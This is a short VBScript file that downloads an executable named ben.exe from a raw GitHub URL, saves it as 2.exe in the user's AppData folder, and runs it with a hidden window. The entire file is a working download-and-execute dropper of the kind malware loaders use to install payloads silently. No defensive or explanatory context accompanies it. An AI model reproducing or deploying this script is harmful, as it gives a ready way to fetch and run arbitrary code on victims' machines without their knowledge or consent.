' Define parameters
url = "https://raw.githubusercontent.com/BinaryDev-0100101/hi/refs/heads/main/ben.exe"
outputFileName = "2.exe"
outputFilePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%AppData%") & "\" & outputFileName

' Create an XMLHTTP object to download the file
Set xmlhttp = CreateObject("MSXML2.XMLHTTP.6.0")
xmlhttp.Open "GET", url, False
xmlhttp.Send

If xmlhttp.Status = 200 Then
    ' Create an ADODB Stream object to save the file
    Set adoStream = CreateObject("ADODB.Stream")
    adoStream.Type = 1 ' Binary type
    adoStream.Open
    adoStream.Write xmlhttp.responseBody
    adoStream.SaveToFile outputFilePath, 2 ' Overwrite if exists
    adoStream.Close

    ' Run the downloaded file silently
    Set shell = CreateObject("WScript.Shell")
    shell.Run outputFilePath, 0, False
End If

' Clean up
Set adoStream = Nothing
Set xmlhttp = Nothing
Set shell = Nothing
